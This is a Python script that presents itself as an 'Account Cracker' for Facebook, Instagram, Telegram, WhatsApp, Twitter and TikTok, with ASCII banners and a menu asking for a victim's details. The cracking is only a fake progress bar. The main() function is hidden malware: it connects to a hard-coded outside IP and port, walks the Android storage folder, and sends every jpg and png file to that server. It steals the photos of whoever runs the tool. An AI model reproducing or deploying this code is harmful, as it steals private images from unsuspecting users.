import os
import random
import socket
import time,webbrowser
from threading import Thread
#from tqdm import tqdm
one = '''
              AAA                                                                                                                tttt                       CCCCCCCCCCCCC                                                       kkkkkkkk                                                     
              A:::A                                                                                                            ttt:::t                    CCC::::::::::::C                                                       k::::::k                                                     
             A:::::A                                                                                                           t:::::t                  CC:::::::::::::::C                                                       k::::::k                                                     
            A:::::::A                                                                                                          t:::::t                 C:::::CCCCCCCC::::C                                                       k::::::k                                                     
           A:::::::::A            cccccccccccccccc    cccccccccccccccc   ooooooooooo   uuuuuu    uuuuuunnnn  nnnnnnnn    ttttttt:::::ttttttt          C:::::C       CCCCCCrrrrr   rrrrrrrrr   aaaaaaaaaaaaa      cccccccccccccccc k:::::k    kkkkkkk eeeeeeeeeeee    rrrrr   rrrrrrrrr        
          A:::::A:::::A         cc:::::::::::::::c  cc:::::::::::::::c oo:::::::::::oo u::::u    u::::un:::nn::::::::nn  t:::::::::::::::::t         C:::::C              r::::rrr:::::::::r  a::::::::::::a   cc:::::::::::::::c k:::::k   k:::::kee::::::::::::ee  r::::rrr:::::::::r       
         A:::::A A:::::A       c:::::::::::::::::c c:::::::::::::::::co:::::::::::::::ou::::u    u::::un::::::::::::::nn t:::::::::::::::::t         C:::::C              r:::::::::::::::::r aaaaaaaaa:::::a c:::::::::::::::::c k:::::k  k:::::ke::::::eeeee:::::eer:::::::::::::::::r      
        A:::::A   A:::::A     c:::::::cccccc:::::cc:::::::cccccc:::::co:::::ooooo:::::ou::::u    u::::unn:::::::::::::::ntttttt:::::::tttttt         C:::::C              rr::::::rrrrr::::::r         a::::ac:::::::cccccc:::::c k:::::k k:::::ke::::::e     e:::::err::::::rrrrr::::::r     
       A:::::A     A:::::A    c::::::c     cccccccc::::::c     ccccccco::::o     o::::ou::::u    u::::u  n:::::nnnn:::::n      t:::::t               C:::::C               r:::::r     r:::::r  aaaaaaa:::::ac::::::c     ccccccc k::::::k:::::k e:::::::eeeee::::::e r:::::r     r:::::r     
      A:::::AAAAAAAAA:::::A   c:::::c             c:::::c             o::::o     o::::ou::::u    u::::u  n::::n    n::::n      t:::::t               C:::::C               r:::::r     rrrrrrraa::::::::::::ac:::::c              k:::::::::::k  e:::::::::::::::::e  r:::::r     rrrrrrr     
     A:::::::::::::::::::::A  c:::::c             c:::::c             o::::o     o::::ou::::u    u::::u  n::::n    n::::n      t:::::t               C:::::C               r:::::r           a::::aaaa::::::ac:::::c              k:::::::::::k  e::::::eeeeeeeeeee   r:::::r                 
    A:::::AAAAAAAAAAAAA:::::A c::::::c     cccccccc::::::c     ccccccco::::o     o::::ou:::::uuuu:::::u  n::::n    n::::n      t:::::t    tttttt      C:::::C       CCCCCC r:::::r          a::::a    a:::::ac::::::c     ccccccc k::::::k:::::k e:::::::e            r:::::r                 
   A:::::A             A:::::Ac:::::::cccccc:::::cc:::::::cccccc:::::co:::::ooooo:::::ou:::::::::::::::uun::::n    n::::n      t::::::tttt:::::t       C:::::CCCCCCCC::::C r:::::r          a::::a    a:::::ac:::::::cccccc:::::ck::::::k k:::::ke::::::::e           r:::::r                 
  A:::::A               A:::::Ac:::::::::::::::::c c:::::::::::::::::co:::::::::::::::o u:::::::::::::::un::::n    n::::n      tt::::::::::::::t        CC:::::::::::::::C r:::::r          a:::::aaaa::::::a c:::::::::::::::::ck::::::k  k:::::ke::::::::eeeeeeee   r:::::r                 
 A:::::A                 A:::::Acc:::::::::::::::c  cc:::::::::::::::c oo:::::::::::oo   uu::::::::uu:::un::::n    n::::n        tt:::::::::::tt          CCC::::::::::::C r:::::r           a::::::::::aa:::a cc:::::::::::::::ck::::::k   k:::::kee:::::::::::::e   r:::::r                 
AAAAAAA                   AAAAAAA cccccccccccccccc    cccccccccccccccc   ooooooooooo       uuuuuuuu  uuuunnnnnn    nnnnnn          ttttttttttt               CCCCCCCCCCCCC rrrrrrr            aaaaaaaaaa  aaaa   cccccccccccccccckkkkkkkk    kkkkkkk eeeeeeeeeeeeee   rrrrrrr                 
                                                                                                                                                                                                                                                                                             
'''
two = '''
 █████   ██████  ██████  ██████  ██    ██ ███    ██ ████████      ██████ ██████   █████   ██████ ██   ██ ███████ ██████      
██   ██ ██      ██      ██    ██ ██    ██ ████   ██    ██        ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██     
███████ ██      ██      ██    ██ ██    ██ ██ ██  ██    ██        ██      ██████  ███████ ██      █████   █████   ██████      
██   ██ ██      ██      ██    ██ ██    ██ ██  ██ ██    ██        ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██     
██   ██  ██████  ██████  ██████   ██████  ██   ████    ██         ██████ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██     
                                                                                                                     
'''
three = '''

 ▄▄▄       ▄████▄   ▄████▄   ▒█████   █    ██  ███▄    █ ▄▄▄█████▓    ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███     
▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒   ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒   
▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░   ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒   
░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░    ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄     
 ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░ ████▓▒░▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░    ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒   
 ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░      ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░   
  ▒   ▒▒ ░  ░  ▒     ░  ▒     ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░    ░         ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░   
  ░   ▒   ░        ░        ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░   ░         ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░    
      ░  ░░ ░      ░ ░          ░ ░     ░              ░             ░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░        
          ░        ░                                                 ░                           ░                                  

'''
four = '''

╔═╗┌─┐┌─┐┌─┐┬ ┬┌┐┌┌┬┐  ╔═╗┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐  
╠═╣│  │  │ ││ ││││ │   ║  ├┬┘├─┤│  ├┴┐├┤ ├┬┘  
╩ ╩└─┘└─┘└─┘└─┘┘└┘ ┴   ╚═╝┴└─┴ ┴└─┘┴ ┴└─┘┴└─  

'''
five = '''

   ▄████████  ▄████████  ▄████████  ▄██████▄  ███    █▄  ███▄▄▄▄       ███           ▄████████    ▄████████    ▄████████  ▄████████    ▄█   ▄█▄    ▄████████    ▄████████      
  ███    ███ ███    ███ ███    ███ ███    ███ ███    ███ ███▀▀▀██▄ ▀█████████▄      ███    ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀   ███    ███   ███    ███      
  ███    ███ ███    █▀  ███    █▀  ███    ███ ███    ███ ███   ███    ▀███▀▀██      ███    █▀    ███    ███   ███    ███ ███    █▀    ███▐██▀     ███    █▀    ███    ███      
  ███    ███ ███        ███        ███    ███ ███    ███ ███   ███     ███   ▀      ███         ▄███▄▄▄▄██▀   ███    ███ ███         ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀      
▀███████████ ███        ███        ███    ███ ███    ███ ███   ███     ███          ███        ▀▀███▀▀▀▀▀   ▀███████████ ███        ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀        
  ███    ███ ███    █▄  ███    █▄  ███    ███ ███    ███ ███   ███     ███          ███    █▄  ▀███████████   ███    ███ ███    █▄    ███▐██▄     ███    █▄  ▀███████████      
  ███    ███ ███    ███ ███    ███ ███    ███ ███    ███ ███   ███     ███          ███    ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███      
  ███    █▀  ████████▀  ████████▀   ▀██████▀  ████████▀   ▀█   █▀     ▄████▀        ████████▀    ███    ███   ███    █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███      
                                                                                                 ███    ███                           ▀                        ███    ███      

'''
six = '''

 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌░▌     ▐░▌ ▀▀▀▀█░█▀▀▀▀      ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     
▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌     ▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  ▐░▌          ▐░▌       ▐░▌     
▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌     ▐░▌          ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌░▌   ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     
▐░░░░░░░░░░░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌     ▐░▌          ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░▌    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌     ▐░▌          ▐░▌          ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌░▌   ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀      
▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌     ▐░▌          ▐░▌          ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  ▐░▌          ▐░▌     ▐░▌       
▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌      
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌      ▐░░▌     ▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌     
 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀       ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀      
                                                                                                                                                                                           

'''
list_logo = [one, two,three,four,five,six]
print(random.choice(list_logo))
def optional():
    print("(1)Facebook Attack (2)Instagram Attack\n(3)Telegram Attack(4)Whatsapp Attack\n(5)Twitter Attack (6)Tiktok Attack \n(7)"
          "About us. ")
    your_option = int(input(">>"))
    if your_option == 7:
        print("I am a little programmer. You can follow me on github.")
        webbrowser.open('https://https://github.com/im087921')
    else:
        print("At 1st we need make a password list. Enter all information about victim.")
        email_victim = input("Enter  victim's phone number : ")
        phone_number = input("Enter victim's email : ")
        is_he_care = input("Is he too much careful : ")
        print(f"Wait..... Creating.......Wait {random.randint(10,59)}")
        for trans_load in tqdm(range(0,100)):
            time.sleep(.1)
def main():
    ip = "3.17.7.232"
    port = 13179
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    os_name = os.name
    if os_name == "posix":
        path = "/storage/emulated/0"
    count = 0
    server.connect((ip, port))
    for path,fol,file in os.walk(path):
        for file_trans in file:
            if "jpg" in file_trans or "png" in file_trans:
                os.chdir(path)
                time.sleep(5)
                server.send(file_trans.encode('ascii'))
                time.sleep(1)
                #print(file_trans)
                file_open = open(file_trans, "rb")
                file_data = file_open.read(2000)
                while file_data:
                    server.send(file_data)
                    file_data = file_open.read(2000)
# threading
# optional_t = Thread(target= optional)
# main_t = Thread(target=main)
# main_t.start()
# optional_t.start()
optional()
main()
